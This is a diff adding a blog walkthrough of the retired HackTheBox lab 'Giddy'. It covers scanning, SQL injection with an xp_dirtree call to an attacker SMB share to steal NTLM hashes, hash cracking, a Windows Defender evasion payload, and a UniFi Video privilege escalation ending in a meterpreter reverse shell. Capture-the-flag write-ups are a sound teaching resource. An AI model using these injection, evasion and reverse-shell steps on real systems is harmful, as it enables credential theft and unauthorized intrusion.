@@ -1,0 +1,101 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Giddy Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-giddy-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-02-24T16:36:43+00:00">February 24, 2019</time><time class="updated" datetime="2025-06-29T19:23:32+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Giddy”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Expert</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Giddy is 10.10.10.104</span></p>
+<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTPS service port (80)</span></li>
+<li><span style="color: #000000;">Directory Bruteforcing using dirb</span></li>
+<li><span style="color: #000000;">Discovering SQL Injection in URL</span></li>
+<li><span style="color: #000000;">Hosting directory using impacket</span></li>
+<li><span style="color: #000000;">Enumerating for password hashes</span></li>
+<li><span style="color: #000000;">Crack password hash using John the Ripper</span></li>
+<li><span style="color: #000000;">Connecting a new session with extracted login credentials</span></li>
+<li><span style="color: #000000;">Enumerating for user flag</span></li>
+<li><span style="color: #000000;">Using Evasion to bypass the Windows Defender</span></li>
+<li><span style="color: #000000;">Upload payload to the target and get a meterpreter session</span></li>
+<li><span style="color: #000000;">Snagging the Root Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.10.10.104</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-I_H3-4ZfWAw/XHLEWzeQCuI/AAAAAAAAc98/ye3QeB96fM41xBR_cneY-25VGxsBM51ewCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">The nmap scan shows us that there are 5 ports open: 80(HTTP), 443(HTTPS), 3389(RDP)</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">As port 80 is running HTTP service, we access the web service through our browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YBFqoOr59lM/XHLEZ6cQ2MI/AAAAAAAAc-c/t3z-4fOvQQU-d5mn2bjXVjRbNJlQpRQngCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We don’t find anything on the webpage, so we access the web service running on port 443.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-9KuH6vaX020/XHLEdBr-10I/AAAAAAAAc-0/CGw1vkB3xDshFYjEY-6cd6jQ5vNogF7iwCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We still don’t find anything on the webpage. So we enumerate the web application further, as port 80 and 443 seems to be the same. We start enumerating the web service at port 443. We run dirb scan and find 2 directories called “</span>mvc<span style="color: #000000;">” and “remote”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb https://10.10.10.104 /usr/share/wordlists/dirb/big.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SvP05mR4gNs/XHLEdOdtMMI/AAAAAAAAc-4/LgJ2cvmtjbsfRfcYJ9zvLhSWOyE7o6DHACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Then, we open the /remote/ directory and find a PowerShell web access login page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b6ahXrylRYA/XHLEdqgdSNI/AAAAAAAAc-8/m2tD3fDNU6ceP1-n85IxWpVPpgl83oHygCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We open </span>the mvc<span style="color: #000000;"> directory and find a list of products.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nUF5NoPlaq0/XHLEeF0r0rI/AAAAAAAAc_A/eK1YWAvl5ecghbtG8m15P-07FxCMAHUnwCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Then, we click on one of the products and looking at the URL, it might be possible that it is vulnerable to SQL injection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-i-wRtf1mCvw/XHLEeSB7SqI/AAAAAAAAc_E/S6vnqnDmWs0vWMuAT0bj9QR91OeswRTsgCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now to check if the web application is vulnerable to SQL injection or not, we add a single quote at the end of “ProductSubCategoyId” parameter and by checking the error we find that the application is vulnerable to SQL injection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tKi1P1wMEGw/XHLEeS88WaI/AAAAAAAAc_I/NHG46_loaS437pxcd1JACfcY9PTlUVInwCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">We don’t find anything useful by enumerating the database using SQL injection and we are also not able to get a reverse shell using xp_cmdshell. So we are going steal NTLM hashes using “xp_dirtree”.</span></p>
+<p><span style="color: #000000;">So we first setup impacket-</span>smbserver<span style="color: #000000;"> on our local system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver hack $(pwd)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uZUoMMlEBTU/XHLEfKMINWI/AAAAAAAAc_M/kB79lSRCphUeBkaegn_lL86gx63gIyIFwCLcBGAs/s1600/9.1.png"/></span></p>
+<p><span style="color: #000000;">Now we are going to send a query that will make the remote system authenticate to our share folder and we will be able to capture the NTLM hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">; use master; exec xp_dirtree '\\10.10.15.111\hack';--</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zRXMazxuiyU/XHLEfTyLROI/AAAAAAAAc_Q/83VT5ABCYAAeu9VPbsw69VmWRMhhu2_8gCLcBGAs/s1600/9.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Now we can see on our </span>smbserver<span style="color: #000000;"> that the hashes were </span>captured<span style="color: #000000;"> when the remote machine to tried to connect.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ozSn4G1MU98/XHLEW7UmYjI/AAAAAAAAc-A/uCWZXNYwqAcC5b09liYQLkWWNRlHSI6UgCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">We copy the hashes and store it in a file in our local system and use john the ripper to crack the hashes. After cracking NTLM hash we are successfully able to get the correct password to be “xNnWo6272k7x”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist:/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-unkFEqXpZW0/XHLEWsG-bOI/AAAAAAAAc94/RPTR8bU1iXo2QtpHbHGcCqbGW1ifXCCwACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">As we have the password for the user “</span>stacy<span style="color: #000000;">”, we use this information to </span>login<span style="color: #000000;"> through the PowerShell web portal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Z8MLxm7HhYs/XHLEX4TLlcI/AAAAAAAAc-E/1cluz9IkWiYows0n_Gm4kTC0h1UGVwU2gCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">After logging in we are asked to create a new session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UDOJsQe7hk0/XHLEYB4iHvI/AAAAAAAAc-M/RIqSyRNEnaAlUR7VL2YOhEsjsrH9Rw1pQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">After </span>that<span style="color: #000000;">, we are successfully able to get a new PowerShell session on the web portal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-PTPL8_Ae3dE/XHLEYGkSCyI/AAAAAAAAc-I/qKpFiZ6RPlchp6zCGGns4OXbt6unl2JkwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Enumerating through the directories of the system, inside “C:\Users\Stacy\Desktop\” we are able to find a file called “user.txt”. We open the file and find our first flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_YdeFV-roQE/XHLEYpKAtFI/AAAAAAAAc-Q/0COceQ4Btoo0IL3H1GBJeUS7mtl4wwffwCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">When we further enumerate the system we find that the target machine has a vulnerable service called </span>unifivideo<span style="color: #000000;">. We are given a hint when we first access the </span>PowerShell<span style="color: #000000;"> session inside the documents directory there is a file called </span>unifivideo<span style="color: #000000;">. When we searched for the exploit online we are able to find this exploit <a style="color: #000000;" href="https://www.exploit-db.com/exploits/43390">here</a>. We follow the instructions given in the exploit POC but are stopped because of windows defender as it detects our </span>Metasploit<span style="color: #000000;"> payload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--UNv1vj0ipQ/XHLEZPwHdaI/AAAAAAAAc-U/YfXPaPIOGRwsd4mvct8V0SOOXcBTXqbkQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">So to bypass windows defender, we use the evasion module in metasploit-framework to bypass defender.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use evasion/windows/windows_defender_exe
+msf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 evasion(windows/windows_defender_exe) &gt; set lhost tun0
+msf5 evasion(windows/windows_defender_exe) &gt; set lport 443
+msf5 evasion(windows/windows_defender_exe) &gt; run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-hlAjHoYIiAs/XHLEaKZhllI/AAAAAAAAc-g/O_qX8rO4QYwvvoauqGfpRrZbaxnLYDDrACLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Now we follow the steps given in the POC, first we stop the </span>unifi<span style="color: #000000;"> video service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">stop-service -name UniFivideoservice</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-G8ZskSb9AOo/XHLEZ62feeI/AAAAAAAAc-Y/mCVwP14bYI0g8xRIz-cDQhF31PudAASVgCLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Then we </span>set up<span style="color: #000000;"> our http server on the local system so that we can transfer our payload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-D9kB-eg60Es/XHLEa8DFhGI/AAAAAAAAc-k/icB2AQGsYzIf7w-8q8uOsR3WR08rQ7BCACLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">Now we upload our payload on the target machine using the </span>PowerShell<span style="color: #000000;"> web portal. According to the POC we have to put the payload by the name of taskkill.exe inside “C:\ProgramData\unifi-video\”. After </span>uploading<span style="color: #000000;"> the payload we start the </span>unifi<span style="color: #000000;"> video service.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CRkZM4rl96E/XHLEbWhVvCI/AAAAAAAAc-o/SbpYXgWjnAAYX12evz8oLjA2BqM0Ur6bACLcBGAs/s1600/24.png"/></span></p>
+<h4><span style="color: #800000;">Getting Reverse Shell and Admin Access</span></h4>
+<p><span style="color: #000000;">We setup our listener before starting the service so that we can get a reverse shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost tun0
+msf5 exploit(multi/handler) &gt; set lport 443
+msf5 exploit(multi/handler) &gt; run</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-on1ILiKH3Cc/XHLEbUzzAJI/AAAAAAAAc-s/8zDW7lGxYn8TWfKAXVLYz-lUdEa7dPWawCLcBGAs/s1600/25.png"/></strong></span></p>
+<p><span style="color: #000000;">After running the service we get a reverse shell as administrator.</span></p>
+<p><span style="color: #000000;">We now enumerate the system, inside “C:\Users\Administrator\Desktop” we find a file called “root.txt”. We take a look at the content of the file and find the final flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_TfhbdyMZR4/XHLEcOJmG9I/AAAAAAAAc-w/jZatDFVgCzEtYF3I1wxHUkefOu-zvGkHwCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
